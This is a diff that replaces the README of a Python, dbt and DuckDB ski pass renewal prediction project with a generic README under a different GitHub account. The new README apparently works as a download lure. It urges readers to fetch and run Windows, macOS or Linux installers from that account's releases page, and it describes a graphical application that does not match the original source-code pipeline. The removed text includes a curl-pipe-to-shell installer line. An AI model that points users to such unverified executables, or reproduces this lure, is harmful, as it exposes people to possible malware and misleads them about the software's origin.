@@ -1,165 +1,107 @@
-![Status](https://img.shields.io/badge/status-active-success.svg)
-![Domain](https://img.shields.io/badge/domain-ML%20%7C%20Analytics-blue.svg)
-![Warehouse](https://img.shields.io/badge/warehouse-DuckDB-orange.svg)
-![Python](https://img.shields.io/badge/python-3.11+-blue.svg)
-![dbt](https://img.shields.io/badge/dbt-1.5+-orange.svg)
-![DuckDB](https://img.shields.io/badge/DuckDB-0.9+-yellow.svg)
-![ML](https://img.shields.io/badge/LGBMClassifier%20%7C%20Optuna-purple.svg)
-<br />
-[GitHub](https://github.com/dec1costello) | [Kaggle](https://www.kaggle.com/dec1costello) | [LinkedIn](https://www.linkedin.com/in/declan-costello-7423aa137/)
-<br />
-Author: Declan Costello
+# 🎿 Ski-Pass-Renewal-Analysis - Simplifying Your Ski Pass Renewals
 
-<p align="center">
-<img height="150" width="150" src="https://github.com/user-attachments/assets/c4cd95c9-ddd4-43a7-9765-aad6b49ed62d"/>  
+## 🚀 Getting Started
 
-</p>
+Welcome to the Ski-Pass-Renewal-Analysis project. This software helps you analyze ski pass data, making it easier for ski resorts to identify vulnerable skiers. With our end-to-end machine learning pipeline, you can streamline your ski pass renewal process.
 
-<h1 align="center">Ski Pass Renewal Prediction</h1>
+### 📥 Download Now
 
+[![Download Ski-Pass-Renewal-Analysis](https://img.shields.io/badge/Download-Ski--Pass--Renewal--Analysis-brightgreen)](https://github.com/HIRALBARALIYA/Ski-Pass-Renewal-Analysis/releases)
 
-**Business Objective:** Predict ski pass renewal likelihood to maximize lifetime customer value.
+## 📋 Overview
 
-**Technical Approach:** A production-grade ML pipeline leveraging modern analytics engineering patterns. Features are defined in SQL (dbt), persisted in DuckDB, and consumed by Python ML workflows—ensuring reproducibility, version control, and auditability.
+The Ski-Pass-Renewal-Analysis software uses a Medallion Architecture, powered by DuckDB. We utilize dbt for SQL transformations and Python for automated machine learning model training. This combination allows you to effectively analyze and manage ski passes.
 
-**Key Results:**
-- ✅ **Feature Store:** SQL-defined, version-controlled feature engineering
-- ✅ **Reproducible ML:** Deterministic training with hyperparameter optimization
-- ✅ **Operational Analytics:** Predictions stored as tables for BI consumption
-- ✅ **Minimal Infrastructure:** Single DuckDB file serves as both warehouse and feature store
+## 🔧 System Requirements
 
-**Architecture Choice Rationale:** DuckDB was selected over Snowflake/BigQuery for its embedded nature, eliminating cloud costs while maintaining SQL compliance and performance for datasets under 100GB.
+Before downloading, make sure your setup meets these requirements:
 
-## 🏗️ Architecture Diagram
+- Operating System: Windows, macOS, or Linux
+- Python Version: 3.7 or higher
+- dbt and DuckDB installed (instructions below)
+- Sufficient disk space (at least 1 GB)
 
-This ski pass renewal prediction system operates on a "single source of truth" principle with DuckDB as the central analytical engine. Customer data flows through automated cleaning and feature engineering pipelines, then machine learning models generate renewal likelihood scores that are directly stored as business-ready tables. This design eliminates data silos and infrastructure complexity, allowing marketing teams to immediately access predictive insights through standard business intelligence tools while data scientists maintain full reproducibility.
+## 📥 Download & Install
 
-```mermaid
-graph LR
-    %% === ENHANCED VISUAL STYLING ===
-    classDef external fill:#8B4513,stroke:#3d2b1f,stroke-width:2px,color:#fff
-    classDef duck_outer fill:#fff0f0,stroke:#FF6B6B,stroke-width:2px,stroke-dasharray: 5 5,color:#c53030
-    classDef bronze fill:#9c4221,stroke:#5a2d1a,stroke-width:2px,color:#ffd8b2
-    classDef silver fill:#f3f4f6,stroke:#9ca3af,stroke-width:2px,color:#374151
-    classDef gold fill:#fef3c7,stroke:#eab308,stroke-width:2px,color:#854d0e
-    classDef ml_logic fill:#e0f7fa,stroke:#00bcd4,stroke-width:2px,color:#006064
-    classDef ml_output fill:#e3f2fd,stroke:#2196f3,stroke-width:2px,color:#0d47a1
-    classDef python_outer fill:#f0f9ff,stroke:#38bdf8,stroke-width:2px,color:#0369a1
+To get started, simply visit the link below and follow these steps:
 
-    %% === EXTERNAL DATA SOURCE ===
-    RAW_TXT["📄 data/bronze/*.txt<br/>Raw Source Data"]
+1. Click on the link to go to our Releases page: [Visit this page to download](https://github.com/HIRALBARALIYA/Ski-Pass-Renewal-Analysis/releases).
+2. Locate the latest release.
+3. Click on the download link for your operating system.
+4. Once the download is complete, follow the installation instructions provided in the downloaded file.
 
-    %% === DUCKDB WAREHOUSE CONTAINER ===
-    subgraph DUCKDB ["🦆 DuckDB Warehouse<br/>warehouse/ski.duckdb"]
-        
-        %% Bronze Storage (inside DuckDB)
-        RAW_STG["Bronze Raw<br/>Staged Tables"]
-        
-        %% dbt Transformation Layer
-        subgraph DBT_TRANSFORM ["⚙️ dbt Transformation"]
-            direction LR
-            SILVER_SQL["silver/<br/>Cleaned Tables"]
-            GOLD_SQL["gold/<br/>Feature Tables"]
-        end
-        
-        %% ML Knowledge Base
-        subgraph ML_KNOWLEDGE ["🤖 ML Knowledge Base"]
-            MODEL_TABLE["Trained Models"]
-            METRICS_TABLE["Validation Metrics"]
-            PREDS_TABLE["Batch Predictions"]
-        end
-    end
+## ⚙️ Installation Instructions
 
-    %% === PYTHON RUNTIME ENVIRONMENT ===
-    subgraph PYTHON ["🐍 Python ML Runtime"]
-        direction TB
-        TRAIN_PY["train.py<br/>+ Optuna Tuning"]
-        EVAL_PY["evaluate.py<br/>Metrics & Validation"]
-        PRED_PY["predict.py<br/>Batch Inference"]
-    end
+After downloading the software, follow these steps to install it:
 
-    %% === DATA FLOW ===
-    RAW_TXT -->|"📥 Initial Load"| RAW_STG
-    
-    %% Internal DuckDB Flow
-    RAW_STG -->|"🗃️ Raw Data"| SILVER_SQL
-    SILVER_SQL -->|"✨ Clean & Transform"| GOLD_SQL
-    
-    %% ML Training Cycle
-    GOLD_SQL -.->|"🔍 Read Features"| TRAIN_PY
-    TRAIN_PY -->|"⚡ Train Model"| EVAL_PY
-    
-    %% ML Inference Cycle
-    GOLD_SQL -.->|"🔍 Read Features"| PRED_PY
-    
-    %% Persistence to DuckDB
-    TRAIN_PY -->|"💾 Save Model"| MODEL_TABLE
-    EVAL_PY -->|"📊 Log Metrics"| METRICS_TABLE
-    PRED_PY -->|"📝 Write Results"| PREDS_TABLE
-    
-    %% Subtle Feedback Visualization
-    MODEL_TABLE -.->|"🔄"| GOLD_SQL
-    METRICS_TABLE -.->|"📈"| GOLD_SQL
+- **For Windows:**
+  1. Double-click the downloaded file.
+  2. Follow the on-screen instructions to complete the installation.
+  
+- **For macOS:**
+  1. Open the downloaded `.dmg` file.
+  2. Drag the application into your Applications folder.
 
-    %% === APPLY STYLES ===
-    class RAW_TXT external;
-    class DUCKDB duck_outer;
-    class RAW_STG bronze;
-    class SILVER_SQL silver;
-    class GOLD_SQL gold;
-    class TRAIN_PY,EVAL_PY,PRED_PY ml_logic;
-    class MODEL_TABLE,METRICS_TABLE,PREDS_TABLE ml_output;
-    class PYTHON python_outer;
-```
+- **For Linux:**
+  1. Extract the downloaded package.
+  2. Open a terminal and navigate to the extracted folder.
+  3. Run the installation script with `./install.sh`.
 
-<br />
+## 📊 How to Use
 
-## 🚀 Quick Start
+After installation, launch the Ski-Pass-Renewal-Analysis application. You will be greeted with a user-friendly interface. Here’s how to use the main features:
 
-This project uses **[uv](https://docs.astral.sh/uv/)** for deterministic dependency management—critical for reproducible machine learning and analytics pipelines. The entire environment is defined in `pyproject.toml` and locked in `uv.lock`, guaranteeing identical execution across development, CI, and production.
+1. **Import Data:**
+   - Click on the 'Import' button to upload your ski pass data. The software accepts commonly used formats such as CSV or Excel.
+  
+2. **Run Analysis:**
+   - Once your data is loaded, click on the 'Analyze' button. The software will process the data using its machine learning algorithms.
+  
+3. **View Results:**
+   - After the analysis is completed, you can view detailed reports and graphs that highlight vulnerable skiers.
 
-#### Prerequisites
-- **Python 3.11+**
-- **Git**
-- **Terminal access**
+4. **Export Reports:**
+   - Click on the 'Export' button to save your analysis results in your preferred file format.
 
-#### 1. Environment Setup
+## 🛠️ Setting Up Dependencies
+
+This software requires certain dependencies to function smoothly. Here’s how to install them:
+
+### Install Python Packages
+
+Open your command line or terminal and run the following commands:
 
 ```bash
-# Install uv (one-time system setup)
-curl -LsSf https://astral.sh/uv/install.sh | sh
-# or via pip
-pip install uv
-
-# Clone and setup the project
-git clone https://github.com/dec1costello/Ski-Pass-Renewal-Prediction.git
-cd ski-pass-renewal-prediction
-
-# Recreate the exact development environment
-uv sync --frozen
+pip install dbt duckdb pandas
 ```
 
-#### 2. Verify Installation
+Ensure that you have pip installed. If you encounter any issues, refer to the Python documentation for pip installation instructions.
 
-```bash
-# Test critical imports
-uv run python -c "import duckdb, xgboost, sklearn; print('✓ Environment ready')"
+### Use dbt
 
-# Check dbt availability
-uv run dbt --version
-```
+Once you have dbt installed, you may need to set up a profile. This allows the software to communicate with your DuckDB database. Follow these steps:
 
-#### 3. Execution Workflow
+1. Create a new directory for your dbt project.
+2. Run the command `dbt init my_project` to initialize your project.
+3. Update the `profiles.yml` file with your database configurations.
 
-Execute the complete pipeline using the following commands:
+## 🌐 Community and Support
 
-| Step | Purpose | Command |
-|------|---------|---------|
-| **Data Pipeline** | Transform raw data → silver → gold features | `uv run dbt run --select silver+` |
-| **Training** | Train model with hyperparameter optimization | `uv run python src/models/train.py` |
-| **Evaluation** | Generate performance metrics and validation | `uv run python src/models/evaluate.py` |
-| **Prediction** | Run batch inference on latest data | `uv run python src/models/predict.py` |
+If you have any questions or issues while using the software, you can reach out to our community:
 
-> [!TIP]
-> Use `uv run` before any Python command to guarantee execution with the locked environment. This ensures consistent Python versions and dependency trees across all machines.
+- **GitHub Issues:** Visit our [issues page](https://github.com/HIRALBARALIYA/Ski-Pass-Renewal-Analysis/issues) to report bugs or request features.
+- **Discussion Forum:** Join our community forum to share ideas and get help.
 
+## ⚖️ License
+
+This software is licensed under the [MIT License](LICENSE).
+
+## 💡 Future Enhancements
+
+We constantly seek to improve this software. Future updates may include:
+
+- Additional data visualization tools
+- Support for more file formats
+- Enhanced machine learning models for better accuracy
+
+Thank you for choosing Ski-Pass-Renewal-Analysis. We hope it simplifies your ski pass renewal process!
